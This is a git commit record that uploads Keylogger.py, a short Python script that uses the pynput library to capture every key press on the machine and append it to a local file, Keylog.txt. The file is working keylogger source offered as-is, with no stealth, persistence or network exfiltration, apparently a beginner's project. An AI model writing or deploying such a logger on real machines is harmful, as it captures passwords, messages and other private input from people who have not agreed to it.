30da9b97f1707e1f9d0307f9e988445980118d2a
Nid1012 <mandaliyanirdosh2001@gmail.com>
2025-07-17 17:10:37 -0700

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("Keylog.txt", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except AttributeError:
+            logkey.write(f'[{key}]')
+
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
